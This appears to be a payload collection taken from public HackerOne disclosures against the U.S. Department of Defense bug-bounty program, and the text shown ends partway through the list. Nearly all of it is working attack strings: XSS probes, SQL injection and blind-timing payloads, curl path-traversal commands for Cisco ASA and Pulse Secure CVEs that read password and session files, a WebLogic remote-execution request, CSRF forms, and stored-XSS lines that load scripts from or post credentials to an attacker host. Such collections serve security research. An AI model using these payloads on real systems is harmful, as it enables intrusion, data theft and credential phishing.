# U.S. Dept Of Defense

224 payloads.

### `a1bb52f5`

```
<h1>JUTSUCE RFI TEST</h1>
<script>alert(document.cookie)</script>
<script>alert('jutsuce')</script>
```

— [Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting (XSS) in ████████](https://hackerone.com/reports/192940) · U.S. Dept Of Defense · [jutsuce](https://hackerone.com/jutsuce)

### `abd6ee96`

```
https://██████/images.ashx?loc=%3C/div%3E%3Cimg%20src=%22target.com%22%20onerror=alert(%22TestingXSS%22
```

**Parameter:** `loc`
— [Content-Injection/XSS ████](https://hackerone.com/reports/205360) · U.S. Dept Of Defense · [c0rte](https://hackerone.com/c0rte)

### `b342e981`

```
root@kali:~/bugbounty# sqlmap -u "https://████/█████████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1*"
         _
 ___ ___| |_____ ___ ___  {1.0.8.2#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://target.com

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey
```

**Parameter:** `c0-param0`
— [SQL injection on https://███████](https://hackerone.com/reports/214798) · U.S. Dept Of Defense · [daveysec](https://hackerone.com/daveysec)

### `6ddcee72`

```
%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
```

**Parameter:** `fullname`
— [reflected xss @ www.█████████](https://hackerone.com/reports/225020) · U.S. Dept Of Defense · [geeknik](https://hackerone.com/geeknik)

### `92e41786`

```
pg_sleep(__30__)--
```

**Parameter:** `t`
— [Blind SQL Injection on DoD Site](https://hackerone.com/reports/242882) · U.S. Dept Of Defense · [mr_r3boot](https://hackerone.com/mr_r3boot)

### `4ad06a01`

```
';declare @q varchar(99);set @q='\\target.com/random'; exec master.dbo.xp_dirtree @q;--
```

— [ SQL injections](https://hackerone.com/reports/272506) · U.S. Dept Of Defense · [lfb](https://hackerone.com/lfb)

### `48b9f5d5`

```
https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil
```

— [SQL Injection on █████](https://hackerone.com/reports/277380) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `69286a46`

```
https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil
```

— [SQL Injection on █████](https://hackerone.com/reports/277380) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `fbd7bd13`

```
GET / HTTP/1.1
Host: www.█████████:80@██████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

— [SSRF vulnerability on ██████████ leaks internal IP and various sensitive information](https://hackerone.com/reports/310036) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)

### `e4f891c4`

```
GET / HTTP/1.1
Host: ████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Cookie: mt=rid=6130; ASPSESSIONIDQABQSQCS=GNPLOPOCDIGPIKHGFMDDBLBG
X--------------: 1.1.1.1      
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
Authorization: Basic ████████
X-BlueCoat-Via: 913daace1d652c00
```

— [SSRF vulnerability on ██████████ leaks internal IP and various sensitive information](https://hackerone.com/reports/310036) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)

### `43f839fb`

```
http://█████████/scripts/ctredirector.dll//?@_FILEhttp://target.com/%3Csvg/onload=confirm(document.cookie
```

**Parameter:** `@_FILE`
— [Corda Server XSS ████████](https://hackerone.com/reports/374057) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)

### `a53ebda6`

```
--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
```

**Parameter:** `username`
— [█████ - DOM-based XSS](https://hackerone.com/reports/377264) · U.S. Dept Of Defense · [yumi](https://hackerone.com/yumi)

### `422c68d6`

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://██████████:443/████Portal/██████████?_███=true&_st=&_pageLabel=███_██████████_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiU
```

**Parameter:** `CCD_itemID`
— [SQL Injection vulnerability located at ████████](https://hackerone.com/reports/384397) · U.S. Dept Of Defense · [rootaccess](https://hackerone.com/rootaccess)

### `758a2404`

```
' OR '1'='1
```

— [SQL Injection in ████](https://hackerone.com/reports/419017) · U.S. Dept Of Defense · [arinerron2](https://hackerone.com/arinerron2)

### `b36faebb`

```
█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
```

**Parameter:** `x-urlpath`
— [Admin panel take over | User info leakage | Mass Comprimise](https://hackerone.com/reports/428757) · U.S. Dept Of Defense · [bigchonk](https://hackerone.com/bigchonk)

### `6523eaa4`

```
POST /████████/Status.aspx?ID=x
```

**Parameter:** `ID`
— [Access to all █████████ files, including CAC authentication bypass](https://hackerone.com/reports/429000) · U.S. Dept Of Defense · [cablej_dds](https://hackerone.com/cablej_dds)

### `98ec1d43`

```
GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
Host: ██████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie:
```

**Parameter:** `doc_id`
— [SQL injection on the https://████/](https://hackerone.com/reports/488795) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `d2cccb31`

```
GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1
Host: █████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/pubs/
Accept-Encoding: gzip, deflate, br
Accept
```

**Parameter:** `pub_group_id`
— [SQL Injection in the get_publications.php on the https://█████](https://hackerone.com/reports/489483) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b09ad1b1`

```
GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1
Host: █████████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: ████
```

**Parameter:** `pub_group_id`
— [SQL Injection in the `move_papers.php` on the https://██████████](https://hackerone.com/reports/491191) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `46b251b5`

```
https://█████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@LANGID
```

**Parameter:** `Customwho`
— [MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass](https://hackerone.com/reports/577612) · U.S. Dept Of Defense · [bohdansec](https://hackerone.com/bohdansec)

### `b9211af1`

```
https://██████████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@nonexisting
```

**Parameter:** `Customwho`
— [MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass](https://hackerone.com/reports/577612) · U.S. Dept Of Defense · [bohdansec](https://hackerone.com/bohdansec)

### `23e5e0a7`

```
curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json
```

— [https://█████████ Vulnerable to CVE-2018-0296 Cisco ASA Path Traversal Authentication Bypass](https://hackerone.com/reports/622864) · U.S. Dept Of Defense · [warsong](https://hackerone.com/warsong)

### `97cb8e98`

```
curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
```

**Parameter:** `path`
— [https://█████████ Vulnerable to CVE-2018-0296 Cisco ASA Path Traversal Authentication Bypass](https://hackerone.com/reports/622864) · U.S. Dept Of Defense · [warsong](https://hackerone.com/warsong)

### `50d2f7da`

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ███
Content-Length: 724
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://target.com/soap/envelope/"> 
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://evil.com/2004/06/soap/workarea/"> 
			<java version="1.8.0_151" class="java.beans.XMLDecoder"> 
			<void class="java.lang.ProcessBuilder"> 
				<array class="java.lang.String" length="3">
				<void index = "0">
				
```

— [Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ \[CVE-2017-10352\]](https://hackerone.com/reports/634630) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `ca197b0d`

```
https://██████████/mission.php?content=crew&flight=DOC&line=Right&missionDate=19-Mar-19&ped=%3Csvg+onload=alert(%27jarvis7%27
```

**Parameter:** `ped`
— [\[███████\] Reflected GET XSS (/mission.php?...&missionDate=*)](https://hackerone.com/reports/648298) · U.S. Dept Of Defense · [jarvis0x1](https://hackerone.com/jarvis0x1)

### `047abe40`

```
>                                                                                       '%20onmouseover=alert('jarvis7')%20'
```

**Parameter:** `rcnum`
— [\[█████\] Reflected GET XSS  (/personnel.php?...&rcnum=*) with mouse action](https://hackerone.com/reports/648348) · U.S. Dept Of Defense · [jarvis0x1](https://hackerone.com/jarvis0x1)

### `0e105133`

```
curl --path-as-is -k -D- 'https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#'
```

— [\[CVE-2019-11510 \] Path Traversal on ████████ leads to leaked passwords, RCE, etc](https://hackerone.com/reports/671857) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `2734aff9`

```
/etc/hosts
```

— [\[CVE-2019-11510 \] Path Traversal on ████████ leads to leaked passwords, RCE, etc](https://hackerone.com/reports/671857) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `7c924725`

```
curl -i -k "https://1████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0d1c561b`

```
curl -i -k "https://1█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `e7a65027`

```
curl -i -k "https://███.████.█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b144a915`

```
curl -i -k "https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0bd3f02a`

```
curl -i -k "https://█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `53ef51f2`

```
curl -i -k "https://mvpn3.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `e02f7538`

```
curl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

— [Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://████](https://hackerone.com/reports/695005) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `9680e640`

```
curl -i -k "https://███/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `d11e3b43`

```
curl -i -k "https://███████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `71ce2855`

```
curl -i -k "https://█████.████.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b0b990c3`

```
curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (████.███.mil)](https://hackerone.com/reports/695429) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `8aac1db3`

```
curl -i -k "https://█████████.██████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (████.███.mil)](https://hackerone.com/reports/695429) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `3abeee11`

```
curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b1f76538`

```
curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `fe1299f3`

```
curl -i -k "https://█████████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `bae5d803`

```
curl -i -k "https://██████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `197b04c7`

```
curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `2854c2dd`

```
curl -i -k "https://███████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `6cbf8070`

```
curl -i -k "https://mvpn3.███/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (█████████.mil)](https://hackerone.com/reports/696400) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `6e9b6f30`

```
https://██████/?s=%27%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `s`
— [\[█████\] — DOM-based XSS on endpoint `/?s=`](https://hackerone.com/reports/708592) · U.S. Dept Of Defense · [usamasood](https://hackerone.com/usamasood)

### `54305f12`

```
https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert(
```

**Parameter:** `auth`
— [Reflected Xss](https://hackerone.com/reports/758854) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)

### `c122356a`

```
https://████████/en/embeddedAuthRedirect.html?auth=javascript:alert(%22xElkomy%22
```

**Parameter:** `auth`
— [Reflected Xss  https://██████/](https://hackerone.com/reports/759418) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)

### `2578fc7c`

```
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
```

**Parameter:** `User-Agent`
— [Blind SQL Injection](https://hackerone.com/reports/771215) · U.S. Dept Of Defense · [mido0x0x](https://hackerone.com/mido0x0x)

### `f517c33d`

```
POST /██████/edit_profile/ HTTP/1.1
Host: ████████

REQUEST HEADER HERE

-----------------------------191691572411478
Content-Disposition: form-data; name="action"

save_info
-----------------------------191691572411478
Content-Disposition: form-data; name="password[original]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="password[confirmed]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="email[ori
```

**Parameter:** `email[original]`
— [Reflected XSS - in Email Input](https://hackerone.com/reports/799839) · U.S. Dept Of Defense · [ahmd_halabi](https://hackerone.com/ahmd_halabi)

### `5d12a1b2`

```
your_email@gmail.com"><img src=x onerror=alert(1);>
```

— [Reflected XSS - in Email Input](https://hackerone.com/reports/799839) · U.S. Dept Of Defense · [ahmd_halabi](https://hackerone.com/ahmd_halabi)

### `81565ef2`

```
<html>
  <body>
    <form action="https://████/████/███/">
      <input type="hidden" name="action" value="delete&#95;profile" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

— [CSRF - Delete Account (Urgent)](https://hackerone.com/reports/799855) · U.S. Dept Of Defense · [ahmd_halabi](https://hackerone.com/ahmd_halabi)

### `28b0df08`

```
alert(XSS)
```

— [Arbitrary file upload and stored XSS via ███ support request](https://hackerone.com/reports/865354) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `a541ac4a`

```
'onerror=%22alert%601%60%22testabcd))/
```

— [RXSS - https://████████/](https://hackerone.com/reports/872304) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)

### `3b74c292`

```
https://███/help-leave/help/index.htm#rhsearch=%3Cmarquee%20loop=1%20onfinish=alert(document.domain)%3Etest%3C%2Fmarquee%3E&ux=search
```

— [HTML Injection leads to XSS on███](https://hackerone.com/reports/874228) · U.S. Dept Of Defense · [lemonoftroy](https://hackerone.com/lemonoftroy)

### `7a14f318`

```
https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fevil.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
```

— [HTML Injection leads to XSS on███](https://hackerone.com/reports/874228) · U.S. Dept Of Defense · [lemonoftroy](https://hackerone.com/lemonoftroy)

### `188aae76`

```
foo"><script src=//target.com/2.js></script><x=".com
```

— [XSS via X-Forwarded-Host header](https://hackerone.com/reports/882220) · U.S. Dept Of Defense · [geeknik](https://hackerone.com/geeknik)

### `2e5bd3b6`

```
"><script src=http://attackerip/blind.js/>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `174b0a4d`

```
<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `38b8b416`

```
<img src=x onerror='javascript:window.open("http://target.com")'></img>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `b7acaa44`

```
https://www.████frame.html#javascript:alert(document.domain
```

— [DOM XSS on https://www.███████](https://hackerone.com/reports/922496) · U.S. Dept Of Defense · [gamer7112](https://hackerone.com/gamer7112)

### `a64da49f`

```
curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `a2072ed5`

```
curl -k "https://████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `8ba0403d`

```
https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `a7eec57f`

```
curl -k "https://██████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `8e061ec6`

```
curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `cb38479c`

```
https://███/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `20cbcf09`

```
> curl -skiL "https://███████/+CSCOE+/session_password.html" \
  -H "Cookie: token=../+CSCOU+/csco_logo.gif"
```

**Parameter:** `token`
— [Unauthenticated Arbitrary File Deletion ("CVE-2020-3187") in ████████](https://hackerone.com/reports/978335) · U.S. Dept Of Defense · [dwisiswant0](https://hackerone.com/dwisiswant0)

### `5336bd31`

```
GET /+CSCOE+/session_password.html HTTP/1.1
Host: ███████
Cookie: token=../+CSCOU+/csco_logo.gif
User-Agent: curl/7.47.0
Accept: */*
```

**Parameter:** `token`
— [Unauthenticated Arbitrary File Deletion ("CVE-2020-3187") in ████████](https://hackerone.com/reports/978335) · U.S. Dept Of Defense · [dwisiswant0](https://hackerone.com/dwisiswant0)

### `44f33414`

```
curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████/+CSCOE+/session_password.html
```

**Parameter:** `token`
— [https://██████ vulnerable to CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD](https://hackerone.com/reports/987090) · U.S. Dept Of Defense · [pwnsauc3_](https://hackerone.com/pwnsauc3_)

### `3944a92c`

```
https://█████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

— [https://████ is vulnerable to cve-2020-3452](https://hackerone.com/reports/998925) · U.S. Dept Of Defense · [moon_shadow](https://hackerone.com/moon_shadow)

### `28b43c63`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://███████/█████████" method="POST">
      <input type="hidden" name="████████" />
      <input type="hidden" name="███" />
      <input type="hidden" name="█████████" />
      <input type="hidden" name="██████████" value="&quot;&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit reques
```

— [POST based RXSS on https://███████/ via ███ parameter](https://hackerone.com/reports/998935) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `54266616`

```
3. Capture the request on burp, change the payload on the █████████ field to "><script>alert("XSS by nagli")></script>
```

— [POST based RXSS on https://███████/ via ███ parameter](https://hackerone.com/reports/998935) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `e9738342`

```
<form action=█████████/WaterControl/shefgraph-historic.cfm?sid=BL110 method=POST><input type=hidden name="fld_graphrslow" value="Y"><input type=hidden name="fld_graphrslow" value="N"><input type=hidden name="Submit" value="View Graph"><input type=hidden name="fld_from1" value="01/01/2020"><input type=hidden name="fld_to1" value="12/31/2020"><input type=hidden name="fld_displaytype" value="S"><input type=hidden name="fld_type1" value="Plot"><input type=hidden name="fld_frompor" value="1&quot;&lt;
```

**Parameter:** `fld_frompor`
— [XSS Reflect to POST █████](https://hackerone.com/reports/1003433) · U.S. Dept Of Defense · [ofjaaaah](https://hackerone.com/ofjaaaah)

### `a8aa7217`

```
<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>
```

**Parameter:** `keyword`
— [Reflected XSS  www.█████ search form](https://hackerone.com/reports/1012249) · U.S. Dept Of Defense · [val_brux](https://hackerone.com/val_brux)

### `86b06347`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.███████" method="POST">
      <input type="hidden" name="keyword" value="&lt;a&#32;href&#61;https&#58;&#47;&#47;naglinagli&#46;github&#46;io&gt;Click&#32;here&#32;to&#32;win&#32;1000&#36;&#33;&lt;&#47;a&gt;" />
      <input type="hidden" name="Find&#32;Case&#32;Studies" value="Find&#32;Case&#32;Studies" />
      <input type="hidden" name="crim
```

— [CSRF to Stored HTML injection at https://www.█████](https://hackerone.com/reports/1014593) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `3c6c260b`

```
simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
```

**Parameter:** `a`
— [Reflected Xss in \[██████\]](https://hackerone.com/reports/1033253) · U.S. Dept Of Defense · [medblgsec](https://hackerone.com/medblgsec)

### `f742afdf`

```
https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
```

**Parameter:** `a`
— [Reflected Xss in \[██████\]](https://hackerone.com/reports/1033253) · U.S. Dept Of Defense · [medblgsec](https://hackerone.com/medblgsec)

### `217c8f00`

```
<iframe onload="alert(██████)" style="display:none"></iframe>
```

— [███ on https://████ enable ███ scraping, injection, stored XSS](https://hackerone.com/reports/1048571) · U.S. Dept Of Defense · [skarsom](https://hackerone.com/skarsom)

### `906333c4`

```
?█████=';}alert("chron0x"); function clickit(){//
```

— [Reflected XSS on █████████](https://hackerone.com/reports/1059395) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)

### `2c035c5a`

```
http://█████/?██████=%27;}alert(%22chron0x%22);%20function%20clickit(){//
```

— [Reflected XSS on █████████](https://hackerone.com/reports/1059395) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)

### `6b00df53`

```
';alert('chron0x');'
```

**Parameter:** `search`
